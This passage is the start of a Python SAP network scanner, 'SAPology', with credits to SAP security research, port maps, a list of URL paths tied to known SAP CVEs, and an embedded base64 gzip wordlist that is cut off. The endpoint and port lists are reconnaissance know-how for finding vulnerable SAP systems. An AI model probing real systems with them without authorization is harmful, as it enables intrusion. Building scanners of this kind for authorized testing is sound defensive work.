#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# MIT License
#
# Copyright (c) 2026 Joris van de Vis
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
"""
SAPology - SAP Network Topology Scanner

Discovers SAP systems on a network, gathers system information,
checks for known vulnerabilities, and generates an HTML report
with SVG topology diagram.

For authorized security testing only.

Original idea & concept: Joris van de Vis

Dependencies: requests, rich (pip install requests rich)

Credits & Acknowledgments:
  This tool builds on the work of several SAP security researchers and
  open-source projects:

  pysap - Martin Gallo (@martingalloar), SecureAuth / OWASP CBAS Project
    https://github.com/OWASP/pysap
    Python library for SAP protocol dissection (NI, Diag, MS, RFC, Router).
    Used as reference for DIAG login screen scraping and SAP NI framing.

  SAP Gateway RCE Exploit - Dmitry Chastuhin (@_chipik)
    https://github.com/chipik/SAP_GW_RCE_exploit
    Proof-of-concept for SAP Gateway remote command execution via
    misconfigured ACLs (sec_info/reg_info). Reference for SAPXPG
    packet construction and gateway vulnerability checks.

  SAP Message Server PoC - Mathieu Geli (@gelfrk) & Dmitry Chastuhin (@_chipik)
    https://github.com/gelim/sap_ms
    SAP Message Server attack tools including dispatcher MITM.
    Research presented as "SAP Gateway to Heaven" at OPCDE 2019.
    Reference for MS binary protocol, server list parsing, and ACL checks.

  SAP Nmap Probes - Mathieu Geli (@gelfrk) & Michael Medvedev (ERPScan)
    https://github.com/gelim/nmap-sap
    Custom Nmap service probes for SAP service fingerprinting (Diag,
    RFC Gateway, Message Server, SAP Router, P4, Enqueue). Reference for
    SAP port definitions, service identification, and protocol-level probes
    (DIAG init, SAProuter 4-null-bytes, P4 SAPP4 probe).

  SAP RECON (CVE-2020-6287) - Dmitry Chastuhin (@_chipik)
    https://github.com/chipik/SAP_RECON
    PoC for CVE-2020-6287 (RECON) - SAP LM Configuration Wizard missing
    authorization check. Original finding by Pablo Artuso (@lmkalg) and
    Yvan 'iggy' G (@_1ggy). Reference for CTCWebService vulnerability detection.

  Onapsis Research Labs
    https://onapsis.com/research
    SAP security research including ICMAD vulnerabilities (CVE-2022-22536,
    CVSS 10.0) discovered by Martin Doyhenard. Reference for HTTP request
    smuggling detection via ICM memory pipe desynchronization.

  SEC Consult Vulnerability Lab - Fabian Hagg
    https://sec-consult.com
    CVE-2022-41272 (CVSS 9.9) - Unauthenticated access to SAP NetWeaver
    P4 service (JMS Connector). Published as SEC Consult SA-20230110-0.
    Reference for P4 protocol vulnerability detection.
"""

import sys
import os
import socket
import struct
import argparse
import json
import html
import ipaddress
import ssl
import time
import base64
import gzip
import io
import traceback
import re
import warnings
import asyncio
import contextlib
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field, asdict
from enum import IntEnum
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple, Any

try:
    import requests
    from requests.exceptions import RequestException
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[-] 'requests' package required: pip install requests")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, MofNCompleteColumn
    from rich.panel import Panel
    HAS_RICH = True
except ImportError:
    HAS_RICH = False


# ═══════════════════════════════════════════════════════════════════════════════
# SAPology Banner
# ═══════════════════════════════════════════════════════════════════════════════

SAPOLOGY_BANNER = r"""
[bold #00CC33]  ╔══════════════════════════════════════════════════════════════════════╗
  ║                                                                      ║
  ║    ██████  █████  ██████   ██████  ██       ██████   ██████  ██  ██  ║
  ║   ██      ██   ██ ██   ██ ██    ██ ██      ██    ██ ██        ████   ║
  ║    █████  ███████ ██████  ██    ██ ██      ██    ██ ██   ███   ██    ║
  ║        ██ ██   ██ ██      ██    ██ ██      ██    ██ ██    ██   ██    ║
  ║   ██████  ██   ██ ██       ██████  ███████  ██████   ██████    ██    ║
  ║                                                                      ║
  ║                    S ⛩ P O L O G Y                                   ║
  ║                                                                      ║
  ║   SAP Network Topology  ·····  Sorry for scanning you ;-)            ║
  ║   ⛩ The scanner that speaks SAPanese                                 ║
  ║   Fluent in DIAG · RFC · Gateway · MS · ICM · J2EE                   ║
  ║   by Joris van de Vis                                                ║
  ║                                                                      ║
  ╚══════════════════════════════════════════════════════════════════════╝[/bold #00CC33]
"""

SAPOLOGY_BANNER_PLAIN = r"""
  +========================================================================+
  |                                                                        |
  |    ██████  █████  ██████   ██████  ██       ██████   ██████  ██  ██    |
  |   ██      ██   ██ ██   ██ ██    ██ ██      ██    ██ ██        ████     |
  |    █████  ███████ ██████  ██    ██ ██      ██    ██ ██   ███   ██      |
  |        ██ ██   ██ ██      ██    ██ ██      ██    ██ ██    ██   ██      |
  |   ██████  ██   ██ ██       ██████  ███████  ██████   ██████    ██      |
  |                                                                        |
  |                     S ⛩ P O L O G Y                                    |
  |                                                                        |
  |   SAP Network Technology  .....  Sorry for scanning you ;-)            |
  |   ⛩ The scanner that speaks SAPanese                                   |
  |   Fluent in DIAG . RFC . Gateway . MS . ICM . J2EE                     |
  |   by Joris van de Vis                                                  |
  |                                                                        |
  +========================================================================+
"""


def print_banner():
    """Print the SAPology banner. Uses Rich if available, falls back to plain text."""
    if HAS_RICH:
        console = Console()
        console.print(SAPOLOGY_BANNER)
    else:
        print(SAPOLOGY_BANNER_PLAIN)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1: Constants & Data Model
# ═══════════════════════════════════════════════════════════════════════════════

# SAP port formulas: base + instance_number
# Maps service_name -> (base_port, description)
SAP_PORTS = {
    "dispatcher":     (3200, "SAP Dispatcher (DIAG)"),
    "gateway":        (3300, "SAP Gateway"),
    "ms_http":        (8100, "Message Server HTTP"),
    "icm_http":       (8000, "ICM HTTP"),
    "icm_https":      (4300, "ICM HTTPS"),
    "sapcontrol":     (50013, "SAPControl SOAP (HTTP)"),
    "sapcontrol_s":   (50014, "SAPControl SOAP (HTTPS)"),
    "j2ee_http":      (50000, "J2EE HTTP"),
    "j2ee_https":     (50001, "J2EE HTTPS"),
    "ms_internal":    (3900, "Message Server Internal"),
}

# Additional fixed ports to check
SAP_FIXED_PORTS = {
    8080:  "SAP Web (alt HTTP)",
    443:   "HTTPS",
    8443:  "HTTPS (alt)",
    1128:  "SAPHostControl HTTP",
    1129:  "SAPHostControl HTTPS",
    3299:  "SAP Router",
    1090:  "SAP Content Server HTTP",
    1091:  "SAP Content Server HTTPS",
    6400:  "SAP BusinessObjects CMS",
    59950: "SAP MDM Server",
    59750: "SAP MDM Import Server",
    44300: "SAP Web Dispatcher HTTPS",
}

# Well-known non-SAP ports that collide with SAP port formulas.
# These are excluded from instance-based port generation to avoid false positives.
NON_SAP_PORTS = {
    3389,  # Windows RDP (collides with Gateway instance 89)
}

SAP_URL_PATHS = [
    ("/sap/public/info", "System information disclosure"),
    ("/sap/bc/soap/rfc", "SOAP RFC endpoint"),
    ("/sap/bc/gui/sap/its/webgui", "Web GUI"),
    ("/sap/bc/webdynpro/", "WebDynpro applications"),
    ("/irj/portal", "Enterprise Portal"),
    ("/irj/go/km/navigation", "Knowledge Management (info leak)"),
    ("/developmentserver/metadatauploader", "CVE-2025-31324 Visual Composer"),
    ("/sap/admin", "ICM administration"),
    ("/sap/admin/public/index.html", "SAP Admin Public Page (info disclosure)"),
    ("/sap/bc/bsp/", "Business Server Pages"),
    ("/sap/bc/rest/", "REST API"),
    ("/sap/opu/odata/", "OData services"),
    ("/sap/wdisp/admin", "Web Dispatcher admin"),
    ("/sap/hana/xs/formLogin", "HANA XS login"),
    ("/sap/hana/xs/admin", "HANA XS admin"),
    ("/sap/hana/ide", "HANA Web IDE"),
    ("/EemAdminService/EemAdmin", "CVE-2020-6207 Solution Manager EEM"),
    ("/servlet/com.sap.ctc.util.ConfigServlet", "CVE-2010-5326 Invoker Servlet"),
    ("/tc.CBS.Appl/tcspseudo", "CVE-2021-33690 NWDI CBS"),
    ("/AdminTools/querybuilder/logon", "CVE-2020-6308 BusinessObjects SSRF"),
    ("/BOE/CMC/", "BusinessObjects Central Management Console"),
    ("/BOE/BI", "BusinessObjects BI Launch Pad"),
    ("/ContentServer/ContentServer.dll?serverInfo", "SAP Content Server"),
    ("/nwa", "NetWeaver Administrator (NWA)"),
    ("/nwa/sysinfo", "NetWeaver Administrator System Info"),
    ("/uddi/api/", "UDDI Directory API"),
    ("/sap/bc/ui2/flp", "Fiori Launchpad"),
    ("/sap/wdisp/admin/public/index.html", "Web Dispatcher Admin (info disclosure)"),
    ("/b1s/v2/", "SAP Business One Service Layer"),
    ("/dir", "Process Integration Directory"),
    ("/rep", "Enterprise Service Repository"),
    ("/sap/opu/odata/iwfnd/catalogservice", "OData Service Catalog"),
    ("/biprws/logon/long", "BusinessObjects REST API (CVE-2024-41730)"),
    ("/biprws/v1/", "BusinessObjects REST API v1"),
]

# Embedded gzip+base64 compressed SAP ICM URL paths wordlist (1633 paths)
# Source: Metasploit sap_icm_paths.txt wordlist
_ICM_PATHS_B64 = (
    "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"
